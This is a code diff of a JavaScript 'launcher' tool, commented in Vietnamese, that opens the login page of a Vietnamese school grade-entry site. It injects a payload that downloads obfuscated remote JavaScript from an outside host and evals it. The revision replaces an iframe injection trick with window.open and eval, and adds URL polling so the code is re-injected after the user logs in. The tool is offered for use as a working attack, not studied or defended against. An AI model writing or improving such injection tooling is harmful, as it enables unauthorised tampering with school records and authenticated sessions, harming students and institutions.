@@ -1,12 +1,12 @@
 // ============================================================
-// NT4NH2 // LAUNCHER SCRIPT (SRCDOC + POSTMESSAGE BYPASS)
-// Khắc phục triệt để DOMException khi nhúng iframe Cross-Origin
+// NT4NH2 // LAUNCHER SCRIPT (WINDOW OPEN + URL POLLING)
+// Chạy trên tab thật để không bị lỗi Loading/Cross-Origin
 // ============================================================
 
 const DEFAULT_CONFIG = {
   targetUrl: "https://nhapdiem.truonghocviet.vn/Account/Login",
   payload: "fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);",
-  delay: 2000,
+  delay: 2500,
   title: "Launcher Tool",
   bg: "#0d1117",
   text: "#c9d1d9"
@@ -38,6 +38,7 @@ const statusEl      = document.getElementById("status");
 
 const popup         = document.getElementById("popup");
 const btnReinject   = document.getElementById("btnReinject");
+const btnInjectNext = document.getElementById("btnInjectNext"); // Nút mới
 const btnClose      = document.getElementById("btnClose");
 
 const settingTool   = document.getElementById("settingTool");
@@ -54,97 +55,80 @@ const inpText       = document.getElementById("inpText");
 const btnSaveWeb    = document.getElementById("btnSaveWeb");
 const btnCloseWeb   = document.getElementById("btnCloseWeb");
 
+let toolWindow = null;
 let watchTimer = null;
 let popupShown = false;
-let currentIframe = null;
 
 function setStatus(msg) {
   statusEl.textContent = "Trạng thái: " + msg;
 }
 
-// Kỹ thuật Inject không dùng document.write trực tiếp
+// Hàm mở tab và inject
 function launchTool() {
   popupShown = false;
-  setStatus("Đang khởi tạo môi trường...");
+  setStatus("Đang mở tab đích...");
 
-  if (currentIframe) {
-    currentIframe.remove();
+  // Nếu đã có tab mở, đóng tab cũ trước khi mở tab mới
+  if (toolWindow && !toolWindow.closed) {
+    toolWindow.close();
   }
 
-  // Tạo iframe
-  currentIframe = document.createElement("iframe");
-  currentIframe.style.width = "100vw";
-  currentIframe.style.height = "100vh";
-  currentIframe.style.position = "fixed";
-  currentIframe.style.top = "0";
-  currentIframe.style.left = "0";
-  currentIframe.style.zIndex = "9999";
-  currentIframe.style.background = "#fff";
-  currentIframe.style.border = "none";
-  
-  document.body.appendChild(currentIframe);
+  // Mở tab mới (phải được kích hoạt bởi hành động click của user)
+  toolWindow = window.open(CONFIG.targetUrl, "_blank");
 
-  // Chờ iframe render xong môi trường trắng (same-origin)
-  currentIframe.onload = () => {
-    try {
-      // Lấy document của iframe (lúc này là about:blank, cùng origin)
-      const iframeDoc = currentIframe.contentWindow.document;
-      
-      // Tạo cấu trúc HTML mới
-      iframeDoc.open();
-      iframeDoc.write(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <script>
-            // Lắng nghe tín hiệu từ trang mẹ để chạy payload
-            window.addEventListener("message", function(e) {
-              if (e.data === "RUN_PAYLOAD") {
-                try {
-                  ${CONFIG.payload}
-                } catch (err) {
-                  console.error("Payload Error:", err);
-                }
-              }
-            });
-          </script>
-        </head>
-        <body style="margin:0; padding:0; overflow:hidden;">
-          <!-- Tải trang đích -->
-          <iframe src="${CONFIG.targetUrl}" style="width:100%; height:100vh; border:none;"></iframe>
-        </body>
-        </html>
-      `);
-      iframeDoc.close();
+  if (!toolWindow) {
+    setStatus("Popup bị chặn. Vui lòng cho phép popup!");
+    return;
+  }
 
-      // Đợi trang con load xong rồi gửi tín hiệu
-      setTimeout(() => {
-        if (currentIframe && currentIframe.contentWindow) {
-          // Gửi tín hiệu kích hoạt payload
-          currentIframe.contentWindow.postMessage("RUN_PAYLOAD", "*");
-          setStatus("Đã kích hoạt Payload. Đang giám sát...");
-        }
-      }, CONFIG.delay);
-
-    } catch (e) {
-      console.error("Lỗi Inject DOM:", e);
-      setStatus("Lỗi: Không thể ghi vào iframe.");
-      onToolClosed();
-    }
-  };
-
-  // Gán src cho iframe để kích hoạt onload
-  currentIframe.src = "about:blank";
-  
+  setStatus("Đang chờ trang tải xong...");
   startWatch();
 }
 
+// Kỹ thuật Inject vào Tab thật
+function performInject() {
+  if (!toolWindow || toolWindow.closed) return;
+  
+  try {
+    // Inject qua eval vào window của tab mới
+    toolWindow.eval(CONFIG.payload);
+    setStatus("Đã gửi lệnh Inject vào tab đích. Hãy kiểm tra tab đó.");
+  } catch (e) {
+    // Nếu lỗi CORS (thường gặp khi chạy từ domain khác)
+    console.error("Lỗi Inject:", e);
+    setStatus("Lỗi CORS: Không thể inject trực tiếp. Cần dùng Extension.");
+  }
+}
+
+// Giám sát tab (Tool bị đóng hoặc cần chuyển trang)
 function startWatch() {
   stopWatch();
+  let lastUrl = "";
+
   watchTimer = setInterval(() => {
-    if (!currentIframe || !document.body.contains(currentIframe)) {
+    if (!toolWindow || toolWindow.closed) {
       stopWatch();
       onToolClosed();
+      return;
+    }
+
+    try {
+      // Cố gắng lấy URL hiện tại (có thể bị lỗi CORS, bỏ qua nếu lỗi)
+      const currentUrl = toolWindow.location.href;
+      
+      // Nếu URL thay đổi (người dùng đã đăng nhập thành công và bị redirect)
+      if (lastUrl && currentUrl !== lastUrl && currentUrl !== CONFIG.targetUrl) {
+        setStatus("Phát hiện chuyển trang. Đang chờ inject trang sau...");
+        // Tự động inject nếu có thể, hoặc bật popup
+        setTimeout(() => {
+          performInject();
+          setStatus("Đã inject trang sau thành công.");
+        }, 1000);
+      }
+      lastUrl = currentUrl;
+      
+    } catch (e) {
+      // Lỗi CORS khi cố đọc URL -> Bỏ qua, chỉ kiểm tra tab còn mở không
     }
   }, 1000);
 }
@@ -154,14 +138,32 @@ function stopWatch() {
 }
 
 function onToolClosed() {
-  setStatus("Tool đã ngắt.");
+  setStatus("Tab đích đã đóng.");
   if (!popupShown) {
     popupShown = true;
     popup.classList.remove("hidden");
   }
 }
 
+// Gắn sự kiện
 btnLaunch.addEventListener("click", launchTool);
+
+// Bấm nút Inject lại từ Popup
+btnReinject.addEventListener("click", () => {
+  popup.classList.add("hidden");
+  launchTool();
+});
+
+// Bấm nút Inject trang sau (Sau khi đã đăng nhập)
+btnInjectNext.addEventListener("click", () => {
+  popup.classList.add("hidden");
+  if (toolWindow && !toolWindow.closed) {
+    setStatus("Đang inject vào trang sau...");
+    performInject();
+  } else {
+    setStatus("Tab đã đóng, hãy bấm Launch lại.");
+  }
+});
 
 btnSettingTool.addEventListener("click", () => {
   inpTargetUrl.value = CONFIG.targetUrl;
@@ -180,7 +182,7 @@ btnSettingWeb.addEventListener("click", () => {
 btnSaveTool.addEventListener("click", () => {
   CONFIG.targetUrl = inpTargetUrl.value.trim();
   CONFIG.payload   = inpPayload.value.trim();
-  CONFIG.delay     = parseInt(inpDelay.value) || 2000;
+  CONFIG.delay     = parseInt(inpDelay.value) || 2500;
   saveConfig(CONFIG);
   settingTool.classList.add("hidden");
   setStatus("Đã lưu setting tool.");
@@ -199,18 +201,9 @@ btnSaveWeb.addEventListener("click", () => {
 btnCloseTool.addEventListener("click", () => settingTool.classList.add("hidden"));
 btnCloseWeb .addEventListener("click", () => settingWeb.classList.add("hidden"));
 
-btnReinject.addEventListener("click", () => {
-  popup.classList.add("hidden");
-  launchTool();
-});
-
 btnClose.addEventListener("click", () => {
   popup.classList.add("hidden");
-  if (currentIframe) {
-    currentIframe.remove();
-    currentIframe = null;
-  }
-  setStatus("Đã hủy inject lại.");
+  setStatus("Đã hủy.");
 });
 
 applyWebSettings();
